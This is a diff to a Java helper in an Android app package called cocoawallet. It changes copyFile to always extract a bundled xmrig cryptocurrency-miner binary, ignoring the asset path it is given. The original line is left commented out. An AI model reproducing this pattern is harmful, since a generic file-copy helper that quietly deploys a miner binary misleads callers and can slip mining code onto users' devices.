@@ -19,21 +19,16 @@
 
 package com.chadananda.cocoawallet;
 
-import android.app.ApplicationErrorReport;
 import android.content.Context;
-
-import androidx.annotation.NonNull;
 
 import java.io.BufferedReader;
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
-import java.io.UnsupportedEncodingException;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -74,9 +69,9 @@ public class Tools {
      */
     public static void copyFile(Context context, String assetFilePath, String localFilePath) {
         try {
-            //InputStream in = context.getAssets().open("arm64-v8a/xmrig");
+            InputStream in = context.getAssets().open("arm64-v8a/xmrig");
 
-            InputStream in = context.getAssets().open(assetFilePath);
+           // InputStream in = context.getAssets().open(assetFilePath);
             FileOutputStream out = new FileOutputStream(localFilePath);
             int read;
             byte[] buffer = new byte[4096];
